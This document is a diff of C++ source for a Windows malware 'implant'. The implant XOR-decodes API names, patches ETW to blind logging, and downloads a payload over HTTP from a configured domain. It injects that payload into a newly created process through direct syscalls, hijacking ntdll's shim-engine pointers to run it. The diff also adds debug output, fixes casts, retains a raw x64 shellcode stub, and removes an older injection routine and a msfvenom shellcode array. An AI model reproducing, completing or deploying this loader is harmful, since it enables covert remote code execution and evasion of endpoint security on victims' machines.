@@ -1,6 +1,8 @@
 #include "implant.hpp"
 
-// #include <iostream>
+#ifdef DEBUG
+#include <iostream>
+#endif
 
 #include "cryptDef.h"
 
@@ -235,9 +237,9 @@ LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress)
 
     while ( dwValue-- ) 
 	{
-        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
+        if ( strcmp((const char*)((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
             dwTextPtr = dwPtr;
-        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
+        if ( strcmp((const char*)((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
             dwMRDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;    
         dwPtr += sizeof(IMAGE_SECTION_HEADER);
     }
@@ -245,7 +247,7 @@ LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress)
     dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;
     dwTextPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;
 
-    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B", 11) ) 
+    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, (LPBYTE)"\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B", 11) ) 
 	{
         dwResultPtr += 12;
         if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) 
@@ -277,7 +279,7 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress)
 
     while ( dwValue-- ) 
 	{
-        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".data") == 0 ) {
+        if ( strcmp((const char*)((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".data") == 0 ) {
             dwDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;  
             break; 
         } 
@@ -286,7 +288,7 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress)
 
     dwPtr = dwEndPtr = (DWORD_PTR) pDllLoadedOffsetAddress;
     dwEndPtr += 0xFF;
-    while ( dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr-dwPtr, "\x44\x38\x25", 3) ) 
+    while ( dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr-dwPtr, (LPBYTE)"\x44\x38\x25", 3) ) 
     {
         dwPtr += 0x3;
         if ( (*(BYTE *)(dwPtr + 0x3)) == 0x00 ) 
@@ -299,65 +301,6 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress)
     return NULL;
 }
 
-
-// int Inject(HANDLE hProc, char * payload, int payload_len) 
-// {			
-// 	PVOID pRemoteCode;
-// 	SIZE_T sizeToAlloc = payload_len;
-// 	NTSTATUS result;
-
-// 	// std::cout << "hProc " << hProc << std::endl;
-
-// 	if(hProc!=-1)
-// 		result = Sw3NtAllocateVirtualMemory_(hProc, &pRemoteCode, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-// 	else
-// 	{
-// 		VirtualAlloc_t pVirtualAlloc  = (VirtualAlloc_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAlloc);	
-// 		pRemoteCode= pVirtualAlloc(NULL, payload_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
-// 	}
-
-// 	// std::cout << "Sw3NtAllocateVirtualMemory_ result " << (long)(result) << std::endl;
-// 	// std::cout << "pRemoteCode " << pRemoteCode << std::endl;
-// 	// std::cout << "hProc " << hProc << std::endl;
-// 	// std::cout << "lastError " << lastError << std::endl;
-
-// 	result = Sw3NtWriteVirtualMemory_(hProc, pRemoteCode, (PVOID)payload, sizeToAlloc, 0);
-
-// 	ULONG oldAccess;
-// 	result = Sw3NtProtectVirtualMemory_(hProc, &pRemoteCode, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
-
-// 	// std::cout << "hProc " << hProc << std::endl;
-// 	// std::cout << "pRemoteCode " << pRemoteCode << std::endl;
-// 	// std::cout << "result " << (long)(result) << std::endl;
-
-// 	HANDLE hThread;
-// 	// __debugbreak();
-
-// 	result = Sw3NtCreateThreadEx_(&hThread, 0x1FFFFF, NULL, hProc, (void*) pRemoteCode, NULL, FALSE, 0, 0, 0, NULL);
-
-// 	// std::cout << "hThread " << hThread << std::endl;
-// 	// std::cout << "result " << (long)(result) << std::endl;
-
-// 	if (hThread != NULL) 
-// 	{
-// 		if(hProc!=-1)
-// 		{
-// 			LARGE_INTEGER timeOut;
-// 			timeOut.QuadPart = 500;
-// 			Sw3NtWaitForSingleObject_(hThread, false, &timeOut);
-// 		}
-// 		else
-// 		{
-// 			WaitForSingleObject_t pWaitForSingleObject  = (WaitForSingleObject_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sWaitForSingleObject);	
-// 			pWaitForSingleObject(hThread, 0xFFFFFFFF);
-// 		}
-
-// 		Sw3NtClose_(hThread);
-// 		return 0;
-// 	}
-	
-// 	return -1;
-// }
 
 BYTE x64_stub[] =   "\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x18\x48"
                     "\x8d\x52\x20\x52\x48\x8b\x12\x48\x8b\x12\x48\x3b\x14\x24\x0f\x84"
@@ -386,32 +329,22 @@ BYTE x64_stub[] =   "\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x1
                     "\xe8\xb8\xff\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
 
 
-// /* Created by msfvenom ( msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f c ) */
-// BYTE x64_shellcode[] =  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-//                         "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-//                         "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-//                         "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-//                         "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-//                         "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-//                         "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-//                         "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-//                         "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-//                         "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-//                         "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-//                         "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-//                         "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-//                         "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-//                         "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-//                         "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-//                         "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
-//                         "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-//                         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-//                         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+// typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
+//   HANDLE             ProcessHandle,
+//   PVOID              *BaseAddress,
+//   ULONG              ZeroBits,
+//   PULONG             RegionSize,
+//   ULONG              AllocationType,
+//   ULONG              Protect
+// );
 
 
+#ifdef DEBUG
+int main()
+#else
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
-// int main()
-{		
+#endif
+{			
 	XOR((char *) sKernel32DLL, sizeof(sKernel32DLL), XorKey, sizeof(XorKey));
 	XOR((char *) sGetProcAddress, sizeof(sGetProcAddress), XorKey, sizeof(XorKey));
 	XOR((char *) sGetModuleHandleA, sizeof(sGetModuleHandleA), XorKey, sizeof(XorKey));
@@ -431,7 +364,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(wsKernel32DLL), sGetProcAddress);
 	pGetModuleHandle = (GetModuleHandle_t) pGetProcAddress(hlpGetModuleHandle(wsKernel32DLL), sGetModuleHandleA);
 
-    // std::cout << "Hello from implant" << std::endl;
 	//
 	// ETW patch
 	//
@@ -440,7 +372,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	bool isPatchEtw = true;
 	if(isPatchEtw)
 	{
-		void * pEventWrite = pGetProcAddress(pGetModuleHandle(sNtdllDLL), sEtwEventWrite);
+		void * pEventWrite = (void*)pGetProcAddress(pGetModuleHandle(sNtdllDLL), sEtwEventWrite);
 		
 		HANDLE hProc=(HANDLE)-1;
 
@@ -470,8 +402,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	VirtualAlloc_t pVirtualAlloc  = (VirtualAlloc_t)pGetProcAddress(pGetModuleHandle(sKernel32DLL), sVirtualAlloc);	
 	LPSTR response = (char*)pVirtualAlloc(NULL, maxSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
 
-	// std::cout << "sDomain " << sDomain << std::endl;
-	// std::cout << "sUri " << sUri << std::endl;
+#ifdef DEBUG
+	std::cout << "sDomain " << sDomain << std::endl;
+	std::cout << "sUri " << sUri << std::endl;
+#endif
 
 	wchar_t wDomain[256];
 	mbstowcs(wDomain, sDomain, sizeof(sDomain));
@@ -483,14 +417,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	HttpGet(pwDomain, pwUri, port, response, responseSize, isHttps);
 
-	// std::cout << "responseSize " << responseSize << std::endl;
+#ifdef DEBUG
+    std::cout << "response " << response << std::endl;
+	std::cout << "responseSize " << responseSize << std::endl;
+#endif
 
 	if(responseSize==0)
 		return -1;
 
     int nSuccess = EXIT_FAILURE;
 
-    // std::cout << "CreateProcessA " << sInjectionProcess << std::endl;
+#ifdef DEBUG
+	std::cout << "sInjectionProcess " << sInjectionProcess << std::endl;
+#endif
     
 	STARTUPINFOA si = { 0 };
     si.cb = sizeof( STARTUPINFOA );
@@ -501,7 +440,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
         return nSuccess;
 
-    // std::cout << "CreateProcessA " << nSuccess << std::endl;
+#ifdef DEBUG
+	std::cout << "CreateProcessA " << nSuccess << std::endl;
+#endif
 
     HANDLE hNtDLL = pGetModuleHandle(sNtdllDLL);
 	
@@ -509,9 +450,32 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     LPVOID pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
     LPVOID pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );
 
-	LPVOID pBuffer;
+#ifdef DEBUG
+	std::cout << "find_SE_DllLoadedAddress " << pSE_DllLoadedAddress << std::endl;
+    std::cout << "pShimsEnabledAddress " << pShimsEnabledAddress << std::endl;
+
+    // getchar();
+
+    std::cout << "GOGO" << std::endl;
+#endif
+
+    // pBuffer need to point to NULL for the syscall to work !!!!
+	PVOID pBuffer = NULL;
     SIZE_T sizeToAlloc = sizeof(x64_stub) + responseSize;
-    Sw3NtAllocateVirtualMemory_(pi.hProcess, &pBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
+
+    // pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)pGetProcAddress(pGetModuleHandle(sNtdllDLL), "NtAllocateVirtualMemory");
+    // NTSTATUS status = myNtAllocateVirtualMemory(hProcess, &pBuffer, 0, (PULONG)&sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    NTSTATUS status = Sw3NtAllocateVirtualMemory_(pi.hProcess, &pBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+#ifdef DEBUG
+if (status != 0) {  // STATUS_SUCCESS is 0
+    printf("NtAllocateVirtualMemory failed with NTSTATUS: 0x%X\n", status);
+}
+    std::cout << "pBuffer " << pBuffer << std::endl;
+#endif
 
     void* placeHolder = find_pattern(x64_stub, sizeof(x64_stub), (LPBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", 8);
     if(placeHolder!=NULL)
@@ -521,13 +485,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	Sw3NtWriteVirtualMemory_(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub)-1), response, responseSize, NULL);
 
 	pPtr = encode_system_ptr((LPVOID) pBuffer);
-	Sw3NtWriteVirtualMemory_(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID) &pPtr, sizeof(LPVOID), NULL);
+	Sw3NtWriteVirtualMemory_(pi.hProcess, pSE_DllLoadedAddress, (PVOID) &pPtr, sizeof(LPVOID), NULL);
 
 	BOOL bEnable = TRUE;
-	Sw3NtWriteVirtualMemory_(pi.hProcess, pShimsEnabledAddress, (LPCVOID) &bEnable, sizeof(BOOL), NULL);
+	Sw3NtWriteVirtualMemory_(pi.hProcess, pShimsEnabledAddress, (PVOID) &bEnable, sizeof(BOOL), NULL);
+    
+#ifdef DEBUG
+	std::cout << "ResumeThread " << std::endl;
+#endif
 
-    // getchar();
-    // std::cout << "ResumeThread " << std::endl;
 	ULONG oldAccess;
     Sw3NtProtectVirtualMemory_(pi.hProcess, &pBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
 
